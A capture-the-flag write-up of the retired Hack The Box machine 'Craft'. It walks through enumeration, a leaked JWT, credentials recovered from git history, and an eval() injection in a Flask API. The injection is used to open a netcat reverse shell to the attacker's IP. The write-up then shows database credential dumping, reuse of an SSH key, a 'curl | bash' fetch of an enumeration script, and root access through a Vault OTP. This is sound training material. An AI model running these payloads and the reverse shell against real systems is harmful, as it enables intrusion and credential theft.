# Craft

This is the write-up for the box Craft that got retired at the 4th January 2020.
My IP address was 10.10.14.19 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.110    craft.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/craft.nmap 10.10.10.110
```

```markdown
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port scan:
```markdown
nmap -p- 10.10.10.110
```
```markdown
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
6022/tcp open  x11
```

## Checking HTTPS (Port 443)

The home page of the website shows the following text:
```markdown
About Craft

Craft aims to be the largest repository of US-produced craft brews accessible over REST. In the future we will release a mobile app to interface with our public rest API as well as a brew submission process, but for now, check out our API!
```

There are two links that both respond with a _HTTP status code 404_:
```markdown
- https://api.craft.htb/api/
- https://gogs.craft.htb/
```

After putting these hostnames into the _/etc/hosts_ file, they load successfully.

**Craft** API:

![Craft API](https://kyuu-ji.github.io/htb-write-up/craft/craft_web-1.png)

**Gogs** self-hosted Git service:

![Gogs service](https://kyuu-ji.github.io/htb-write-up/craft/craft_web-2.png)

### Checking Craft API

Lets test the _auth_ operation:

```markdown
/auth/check --> Try it out --> Execute

Result: Code 403 - Forbidden
```
```markdown
/auth/login --> Try it out --> Execute

Result: Login prompt
```

It wants HTTP Authorization and login is required before anything else works.

### Checking Gogs

The software [Gogs](https://gogs.io/) is an Open-Source platform for **Git** operations and version control similar to **GitHub**.
In here the code for the **Craft API** is hosted:
```markdown
Explore --> Craft / craft-api
```

In this repository there is one issue and in this issue is an API-Token that could be useful:

![Repository issue](https://kyuu-ji.github.io/htb-write-up/craft/craft_web-3.png)

```markdown
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```

#### JSON Web Token

This is a **JSON Web Token (JWT)** that is separated into three parts by a _dot_ and can be decoded with Base64.

Type and algorithm in first string:
```markdown
echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 | base64 -d
```
```markdown
{"alg":"HS256","typ":"JWT"}
```

- HS256 = **HMAC with SHA-256**

Data inside of token in second string:
```markdown
echo -n eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0 | base64 -d
```
```markdown
{"user":"user","exp":1549385242}
```

- Expiration date of epoch time _1549385242_ = February 5, 2019 GMT

Signing of token in third string:
```markdown
-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw
```

This string signs the first pieces of the token and we can try to Brute-Force the secret out of it, to generate our own JWT-Token.
For cracking either this [JWT-cracker](https://github.com/brendan-rius/c-jwt-cracker) or **Hashcat** can be used:
```markdown
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw
```

```markdown
hashcat -m 16500 craft_jwt.token /usr/share/wordlists/rockyou.txt
```

Unfortunately it did not succeed in cracking the secret.

#### Analyzing the Git Repository

The user _dinesh_ added a fix for the issue in commit _c414b16057_, but has actually coded in another vulnerability by using an `eval` function that gives direct user input:

```markdown
(...)
-        create_brew(request.json)
-        return None, 201

+
+        # make sure the ABV value is sane.
+        if eval('%s > 1' % request.json['abv']):
+            return "ABV must be a decimal value less than 1.0", 400
+        else:
+            create_brew(request.json)
+            return None, 201
(...)
```

We need to remember that the _abv_ parameter could be vulnerable to user input.

By cloning the repository into our local client, it can be analyzed easier:
```markdown
git -c http.sslVerify=false clone https://gogs.craft.htb/Craft/craft-api.git
```

There are tools that try to automatically find secrets and tokens, but both find nothing:
- [GitLeaks](https://github.com/zricethezav/gitleaks)
- [TruffleHog](https://github.com/dxa4481/truffleHog)

So we will analyze this repository manually:
```markdown
git log
```

Searching through all commits:
```markdown
git diff e55e12d800248c6bddf731462d0150f6e53c0802
git diff a2d28ed1554adddfcfb845879bfea09f976ab7c1
git diff 10e3ba4f0a09c778d7cec673f28d410b73455a86
git diff c414b160578943acfe2e158e89409623f41da4c6
(...)
```

The commit _10e3ba4f0a09c778d7cec673f28d410b73455a86_ had a password in _tests/test.py_ for _dinesh_:
```python
# (...)
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
# (...)
```

After trying the password on all services, it worked on the **Gogs** login, but has no admin rights on the platform.

#### Getting Command Execution with Credentials

By modifying _tests/test.py_ and putting the credentials and abusing the _abv_ parameter, it can be tested for command execution:
```python
# (...)
requests.packages.urllib3.disable_warnings()

cmd = '__import__("os").system("ping -c 1 10.10.14.19")'

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)

# (...)

brew_dict['abv'] = cmd

# (...)
```

Executing the script:
```markdown
python3 test.py
```

After executing the script and listening on incoming ICMP packets with `tcpdump`, it sent packets successfully and proofed command execution.
Changing the `ping` command to a reverse shell command:
```python
# (...)
cmd = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 9001 >/tmp/f')"
# (...)
```

After executing _test.py_ again, it will start a reverse shell connection on my IP and port 9001 as _root_ on a client with the hostname _5a3d243127f5_ that probably is a **Docker container**.

## Enumerating the Docker container

In the application directory _/opt/app/craft_api_ is a file called _settings.py_ which has more credentials in it:
```markdown
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'

# Flask-Restplus settings
(...)
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

Lets modify _/opt/app/dbtest.py_ to show all databases:
```python
# (...)
try:
    with connection.cursor() as cursor:
        sql = "show tables;"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)
# (...)
```

```markdown
{'Tables_in_craft': 'brew'},
{'Tables_in_craft': 'user'}
```

Now the tables of the database can be enumerated by using different SQL queries. Enumerating database _user_:
```markdown  
sql = "select * from user;"
```
```markdown  
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'},
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
```

The credentials of _ebachman_ don't work but the credentials of _gilfoyle_ work on **Gogs**.
This user has a private repository on his account called _craft-infra_.

## Checking Private Repository

This repository can also be cloned onto our local box to analyze it further:
```markdown
git -c http.sslVerify=false clone https://gogs.craft.htb/gilfoyle/craft-infra
```

Running **TruffleHog** over the repository:
```markdown
cd craft-infra

trufflehog .
```

It found a public and a private SSH key in the hidden folder _./ssh/id_rsa_.
This SSH key works and asks for a password and fortunately for us, _gilfoyle_ used the same password for SSH as in the database in **Gogs**:
```markdown
ssh -i id_rsa gilfoyle@10.10.10.110
```

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration Script**:
```markdown
curl 10.10.14.19/LinEnum.sh | bash
```

In the home directory of _/home/gilfoyle_ is a hidden file called _.vault-token_, which is an authentication file for [Vault by HashiCorp](https://www.vaultproject.io/docs/concepts/tokens).
It can also be used as a [Vault Tokens for SSH](https://www.vaultproject.io/docs/commands/ssh).

The file _/vault/secrets.sh_ in the repository _craft-infra_ shows that the default user for this token is _root_:
```markdown
vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

Using the Vault token to authenticate via root:
```markdown
vault ssh -mode=otp -role=root_otp root@127.0.0.1
```

This generates an OTP that has to be copied into the password field and then it logs us in as root!
